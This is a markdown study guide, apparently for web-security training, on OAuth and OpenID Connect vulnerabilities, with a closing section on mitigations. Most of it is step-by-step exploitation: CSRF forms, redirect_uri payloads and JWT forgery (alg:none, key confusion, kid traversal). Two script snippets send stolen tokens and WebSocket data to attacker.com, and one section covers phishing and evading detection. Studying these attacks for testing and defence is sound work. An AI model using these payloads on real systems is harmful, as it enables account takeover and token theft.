## OAuth Authentication Vulnerabilities

- **What OAuth is**
  - A framework that enables applications to request limited access to user accounts on other applications
  - Allows third-party access without exposing user credentials
  - Originally designed for authorization but commonly used for authentication
  - Built on a delegated authorization model with multiple components:
    - Client application (relying party)
    - Authorization server
    - Resource server
    - Resource owner (the user)
  - Uses tokens instead of credentials for access
  - Implemented through various "flows" or "grant types"
  - Commonly integrated with social media login features

- **OAuth flows and grant types**
  - **Authorization Code Flow**
    - Most secure flow designed for server-side applications
    - Uses a back-channel for sensitive token exchange
    - Requires client ID and secret
    - Provides both access tokens and refresh tokens
    - Process:
      1. User initiates login with OAuth provider
      2. Authorization request to authorization server
      3. User authenticates and grants permissions
      4. Authorization code returned to client via redirect URI
      5. Client exchanges code for tokens via back-channel
      6. Client uses tokens to access protected resources
  
  - **Implicit Flow**
    - Designed for browser-based applications
    - No back-channel communication
    - Access token returned directly in URI fragment
    - Less secure, recommended only for single-page applications
    - Process:
      1. User initiates login with OAuth provider
      2. Authorization request with response_type=token
      3. User authenticates and grants permissions
      4. Access token returned directly in URI fragment
      5. Client extracts token from fragment and uses it
  
  - **Client Credentials Flow**
    - Used for machine-to-machine communication
    - No user interaction required
    - Client uses its own credentials to obtain an access token
  
  - **Resource Owner Password Credentials Flow**
    - User credentials directly provided to client application
    - Client exchanges credentials for tokens
    - Requires high trust between user and client
    - Legacy flow, not recommended for modern applications

- **How vulnerabilities arise**
  - Vague OAuth specification with many optional components
  - Complex implementation with numerous configuration options
  - Security dependent on developer implementation choices
  - Sensitive data often transmitted through the browser
  - Confusion between authorization and authentication
  - Lack of built-in security features
  - Inconsistent validation between components
  - Overreliance on default configurations
  - Misunderstanding of security implications
  - Inadequate testing and security review

- **How to identify OAuth implementations**
  - Look for "Log in with [social media]" buttons
  - Monitor HTTP traffic for OAuth-specific parameters:
    - client_id, redirect_uri, response_type, scope, state
  - Identify authorization endpoints with URL patterns:
    - /oauth/authorize, /oauth2/auth, /authorize
  - Look for token endpoints:
    - /oauth/token, /oauth2/token, /token
  - Check for userinfo endpoints:
    - /oauth/userinfo, /userinfo, /me
  - Examine configuration endpoints:
    - /.well-known/oauth-authorization-server
    - /.well-known/openid-configuration
  - Analyze JavaScript files for OAuth client implementations
  - Check HTTP response headers for OAuth-related information

- **Using Burp Suite for OAuth testing**
  - Proxy setup for OAuth analysis:
    1. Configure browser to use Burp Proxy
    2. Set up Proxy listener on port 8080
    3. Install Burp CA certificate
    4. Enable proxy history
  - Capturing OAuth flows:
    1. Initiate OAuth authentication process
    2. Observe requests/responses in Proxy history
    3. Identify key OAuth parameters and endpoints
    4. Track tokens and authorization codes
  - Using Burp extensions:
    1. AuthorizationMatcher for OAuth endpoint detection
    2. OAuth 2.0 Token Analyzer for token inspection
    3. JSON Web Token Attacker for JWT analysis
  - Tools for testing:
    1. Burp Repeater for parameter manipulation
    2. Burp Intruder for brute force attacks
    3. Burp Sequencer for token randomness analysis
    4. Burp Decoder for encoding/decoding parameters

- **Step-by-step exploitation techniques**

  - **Client-side vulnerabilities**
    1. **Implicit flow exploitation**:
       - Step 1: Identify a web application using OAuth implicit flow
       - Step 2: Capture the authentication process in Burp
       - Step 3: Analyze how the client processes tokens received via URI fragments
       - Step 4: Look for POST requests sending the access token to the server
       - Step 5: Identify if the server validates the token properly or just accepts it
       - Step 6: Create a malicious request with a victim's user ID but your access token
       - Step 7: Send the request and check if you gain access to the victim's account
       - Example: Change `POST /authenticate` request from `{"token":"YOUR_TOKEN","user_id":"YOUR_ID"}` to `{"token":"YOUR_TOKEN","user_id":"VICTIM_ID"}`

    2. **Missing state parameter exploitation (CSRF)**:
       - Step 1: Analyze the OAuth flow for presence of state parameter
       - Step 2: If state parameter is missing, prepare a CSRF attack
       - Step 3: Create a malicious page that initiates OAuth flow with your client_id
       - Step 4: Set redirect_uri to the legitimate callback URL
       - Step 5: Trick victim into visiting the malicious page
       - Step 6: When victim is authenticated, their account becomes linked to your external account
       - Example HTML for attack page:
       ```html
       <html>
         <body onload="document.forms[0].submit()">
           <form action="https://oauth-provider.com/authorize" method="GET">
             <input type="hidden" name="client_id" value="CLIENT_ID" />
             <input type="hidden" name="redirect_uri" value="https://legitimate-app.com/callback" />
             <input type="hidden" name="response_type" value="code" />
             <input type="hidden" name="scope" value="email profile" />
           </form>
         </body>
       </html>
       ```

    3. **Redirect URI manipulation**:
       - Step 1: Identify the redirect_uri parameter in authorization requests
       - Step 2: Test for validation flaws by modifying the parameter
       - Step 3: Try subdirectory manipulations (path traversal)
       - Step 4: Test subdomain variations if allowed
       - Step 5: Test for open redirects on legitimate domains
       - Step 6: Exploit to redirect authorization codes/tokens to attacker-controlled endpoints
       - Example manipulations:
         - Original: `redirect_uri=https://legitimate-app.com/oauth/callback`
         - Path traversal: `redirect_uri=https://legitimate-app.com/oauth/callback/../../../attacker/controlled/path`
         - Subdomain: `redirect_uri=https://attacker-controlled.legitimate-app.com`
         - Extra parameters: `redirect_uri=https://legitimate-app.com/oauth/callback?next=https://attacker.com`
         - Different port: `redirect_uri=https://legitimate-app.com:8080/callback`

    4. **Flawed scope validation**:
       - Step 1: Analyze the scopes requested during OAuth flow
       - Step 2: Capture an access token with limited scope
       - Step 3: Test if resource server properly validates scopes
       - Step 4: Attempt to access endpoints requiring higher privileges
       - Step 5: Modify scope parameter in token requests
       - Step 6: Check if access is granted despite insufficient scope
       - Example: Change API request from `/userinfo?scope=email` to `/userinfo?scope=email+profile+admin`

  - **Authorization code attacks**
    1. **Code interception**:
       - Step 1: Identify the OAuth authorization flow
       - Step 2: Look for flaws in redirect_uri validation
       - Step 3: Create a malicious redirect_uri pointing to attacker-controlled domain
       - Step 4: Initiate OAuth flow with the malicious redirect_uri
       - Step 5: Intercept the authorization code
       - Step 6: Quickly use the code with the legitimate redirect_uri
       - Step 7: Complete authentication as the victim
       - Example: Change `redirect_uri=https://legitimate-app.com/callback` to `redirect_uri=https://attacker.com/logging`

    2. **Code replay attacks**:
       - Step 1: Capture a legitimate authorization code from your own OAuth flow
       - Step 2: Test if the code can be used multiple times
       - Step 3: Check if the authorization server invalidates codes after use
       - Step 4: Try using the same code with different redirect_uri values
       - Step 5: Check for proper time-based expiration of codes
       - Example: Replaying the same authorization request multiple times with the same code value

    3. **PKCE bypass (code verifier attacks)**:
       - Step 1: Identify if PKCE is implemented (code_challenge parameter)
       - Step 2: Test if code_verifier is properly validated
       - Step 3: Try omitting the code_verifier in token requests
       - Step 4: Test if simple code_verifier values are accepted
       - Step 5: Check if code_challenge_method validation is enforced
       - Example: Send token request without code_verifier or with incorrect code_verifier

  - **Access token attacks**
    1. **Token theft via referrer leakage**:
       - Step 1: Identify applications using implicit flow (token in URL fragment)
       - Step 2: Look for pages that handle URL fragments and make external requests
       - Step 3: Test if the Referrer header includes the full URL with token
       - Step 4: Create a page that generates external requests after receiving token
       - Step 5: Exploit to steal tokens via Referrer header
       - Example: Create a page with an image: `<img src="https://attacker.com/log">`

    2. **Insufficient token validation**:
       - Step 1: Capture a legitimate access token
       - Step 2: Analyze the token format (JWT, reference token, etc.)
       - Step 3: Test if the resource server properly validates the token
       - Step 4: Try using expired tokens or tokens for different resources
       - Step 5: Check if token signature validation is enforced
       - Step 6: Test modifying token claims if using JWT
       - Example: Modify JWT payload to change subject or scope claims

    3. **Cross-site WebSocket hijacking with tokens**:
       - Step 1: Identify WebSocket connections authenticated with OAuth tokens
       - Step 2: Check if WebSocket connections lack CSRF protections
       - Step 3: Create a malicious page that establishes WebSocket connection
       - Step 4: Use victim's authentication to access their data
       - Step 5: Exfiltrate sensitive information
       - Example JavaScript:
       ```javascript
       <script>
         var ws = new WebSocket('wss://vulnerable-app.com/socket');
         ws.onmessage = function(event) {
           fetch('https://attacker.com/log?data=' + encodeURIComponent(event.data));
         };
       </script>
       ```

  - **JWT token vulnerabilities** (OpenID Connect)
    1. **Alg:none signature bypass**:
       - Step 1: Identify JWT tokens used for authentication
       - Step 2: Decode the token and inspect the header
       - Step 3: Modify the header to set "alg":"none"
       - Step 4: Remove the signature part
       - Step 5: Test if modified token is accepted
       - Example:
         - Original: `eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIn0.SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c`
         - Modified: `eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIn0.`

    2. **JWT key confusion**:
       - Step 1: Locate public keys or certificates used by the application
       - Step 2: Convert public key to appropriate format
       - Step 3: Modify JWT header to change signature algorithm (RS256 to HS256)
       - Step 4: Sign the token using the public key as the HMAC secret
       - Step 5: Test if application accepts the manipulated token
       - Example: Change header from `{"alg":"RS256"}` to `{"alg":"HS256"}`

    3. **JWT kid header injection**:
       - Step 1: Identify JWTs using the "kid" (Key ID) header parameter
       - Step 2: Test for directory traversal in the kid parameter
       - Step 3: Point kid to a predictable file on the server
       - Step 4: Sign a malicious token using the content of that file as the key
       - Step 5: Test if the application accepts the forged token
       - Example: Set kid to `{"kid":"../../../dev/null"}`

  - **OAuth account takeover techniques**
    1. **Pre-account linking attacks**:
       - Step 1: Create accounts with target email addresses on OAuth provider
       - Step 2: Wait for victim to use "Log in with [provider]" functionality
       - Step 3: Victim's account becomes linked with attacker-controlled OAuth account
       - Step 4: Use OAuth to authenticate as the victim
       - Mitigation checking: Test if provider verifies email ownership

    2. **Account linking CSRF**:
       - Step 1: Identify account linking functionality
       - Step 2: Check for CSRF vulnerabilities (missing state parameter)
       - Step 3: Create CSRF exploit to link victim's account to attacker's
       - Step 4: Deliver exploit to victim
       - Step 5: Access victim's account using attacker's OAuth credentials
       - Example: Create hidden form that submits link request

    3. **Secondary channel account takeover**:
       - Step 1: Identify password reset or account recovery functionality
       - Step 2: Check if OAuth-linked email is used for recovery
       - Step 3: Link your OAuth account with target email
       - Step 4: Trigger password reset to that email
       - Step 5: Intercept recovery link via OAuth email scope
       - Step 6: Reset victim's password and take over account

  - **Advanced exploitation techniques**
    1. **Chained vulnerabilities**:
       - Step 1: Identify redirect_uri validation flaws
       - Step 2: Find XSS vulnerability on legitimate domain
       - Step 3: Set redirect_uri to XSS-vulnerable page
       - Step 4: Exploit XSS to steal tokens/codes
       - Step 5: Use stolen credentials to access victim accounts
       - Example chain:
         1. Discover redirect_uri accepts path traversal
         2. Find reflected XSS on `/search?q=` endpoint
         3. Set `redirect_uri=https://legitimate-app.com/search?q=<script>fetch('https://attacker.com/steal?token='+location.hash.substring(1))</script>`
         4. Victim visits malicious site, completes OAuth flow
         5. Token is sent to attacker's server

    2. **Provider-specific vulnerabilities**:
       - Step 1: Research known vulnerabilities for specific OAuth providers
       - Step 2: Check provider's OAuth implementation details
       - Step 3: Test for specific bypasses and weaknesses
       - Step 4: Exploit provider-specific issues (custom parameters, etc.)
       - Step 5: Use provider vulnerabilities to compromise client applications
       - Example: Some providers have custom parameters like `display=popup` or `prompt=none` that can be abused

    3. **Reverse OAuth phishing**:
       - Step 1: Clone legitimate login page with OAuth options
       - Step 2: Set up malicious OAuth application with similar name
       - Step 3: When victim tries to authenticate, present real OAuth consent screen
       - Step 4: Collect access tokens granted to malicious application
       - Step 5: Use tokens to access victim's data on provider
       - Example: Register "NetflixHelper" OAuth app, phish users to grant access

- **OpenID Connect specific vulnerabilities**
  1. **ID token manipulation**:
     - Step 1: Obtain an ID token via OpenID Connect flow
     - Step 2: Decode and analyze token structure
     - Step 3: Test for signature validation issues
     - Step 4: Modify claims and create forged tokens
     - Step 5: Test if application accepts manipulated tokens
     - Example: Change sub claim to another user's identifier

  2. **UserInfo endpoint attacks**:
     - Step 1: Identify the UserInfo endpoint
     - Step 2: Test access with manipulated access tokens
     - Step 3: Check for SSRF via UserInfo endpoint
     - Step 4: Test if responses are cached insecurely
     - Step 5: Look for information leakage
     - Example: Send request to `/userinfo` with manipulated token scopes

  3. **Claim vulnerabilities**:
     - Step 1: Analyze claims used for authentication decisions
     - Step 2: Test if applications properly validate critical claims
     - Step 3: Check for over-reliance on non-essential claims
     - Step 4: Manipulate custom claims to gain privileges
     - Step 5: Test signing vulnerabilities for self-issued tokens
     - Example: If app uses "email" claim for account mapping, register account with victim's email

- **Discovery and configuration endpoints**
  1. **JWKS endpoint vulnerabilities**:
     - Step 1: Locate the JWKS (JSON Web Key Set) endpoint
     - Step 2: Test for key injection attacks
     - Step 3: Check if endpoint is properly secured
     - Step 4: Look for information leakage
     - Step 5: Test cache poisoning attacks
     - Example: If JWKS is cached, try to inject malicious keys

  2. **Metadata document manipulation**:
     - Step 1: Locate the OpenID Connect discovery document
     - Step 2: Analyze endpoints and supported features
     - Step 3: Look for SSRF via dynamic provider configuration
     - Step 4: Test for directory traversal in issuer validation
     - Step 5: Check for improper caching of configuration
     - Example: If client allows dynamic providers, point to attacker-controlled discovery document

- **Detection evasion techniques**
  1. **Gradual permission escalation**:
     - Step 1: Start with minimal scope requests
     - Step 2: Gradually increase permissions over time
     - Step 3: Avoid suspicious combinations of scopes
     - Step 4: Distribute attacks across multiple sessions
     - Step 5: Mimic legitimate application behavior
     - Example: Instead of requesting all permissions at once, request them incrementally

  2. **Delayed exploitation**:
     - Step 1: Obtain legitimate access tokens through standard flows
     - Step 2: Wait before exploiting vulnerabilities
     - Step 3: Use tokens at times matching normal user behavior
     - Step 4: Avoid rapid or automated exploitation patterns
     - Step 5: Distribute attacks across multiple client applications
     - Example: Collect tokens but wait hours before using them for attacks

  3. **Provider-specific obfuscation**:
     - Step 1: Research provider's security monitoring patterns
     - Step 2: Avoid known detection triggers
     - Step 3: Use legitimate-looking redirect URIs
     - Step 4: Maintain believable user agent and client behavior
     - Step 5: Use different IP addresses for different attack phases
     - Example: If targeting Google OAuth, use redirect URIs that look like legitimate Google client applications

  4. **Manipulating state parameter for fingerprinting evasion**:
     - Step 1: Analyze how the application generates state parameters
     - Step 2: Create state values that match legitimate patterns
     - Step 3: Include timestamps or other time-based components
     - Step 4: Avoid patterns that might trigger anomaly detection
     - Step 5: Use different state values for different attack attempts
     - Example: If state contains timestamp + hash, generate values following same pattern

- **Prevention and mitigation**
  1. **Secure OAuth implementation for clients**:
     - Use authorization code flow with PKCE instead of implicit flow
     - Implement and validate the state parameter to prevent CSRF
     - Store and verify redirect_uri values server-side
     - Use strict redirect_uri validation with exact matching
     - Validate tokens on the server side before establishing sessions
     - Implement proper scope validation at all endpoints
     - Use short-lived access tokens with refresh tokens
     - Store tokens securely (not in localStorage or cookies without proper protection)

  2. **Server-side security controls**:
     - Require client authentication for token exchange
     - Enforce one-time use of authorization codes
     - Implement short expiration times for codes and tokens
     - Use signed and encrypted tokens
     - Validate all token claims before granting access
     - Implement proper scope validation at resource server
     - Set up monitoring for unusual OAuth patterns
     - Enforce PKCE for all clients, even confidential ones

  3. **User-focused protections**:
     - Clearly communicate requested permissions to users
     - Provide options to revoke access for connected applications
     - Implement session management with OAuth token binding
     - Show active sessions and connected applications
     - Require re-authentication for sensitive operations
     - Notify users of new OAuth application connections
     - Provide detailed logging of OAuth authorizations

  4. **Infrastructure security**:
     - Use HTTPS for all OAuth-related communication
     - Implement proper CORS headers for OAuth endpoints
     - Set secure and HTTP-only flags for any cookies
     - Use Content-Security-Policy headers
     - Implement rate limiting on authorization and token endpoints
     - Set up monitoring for unusual token issuance patterns
     - Configure proper cache-control headers to prevent token leakage
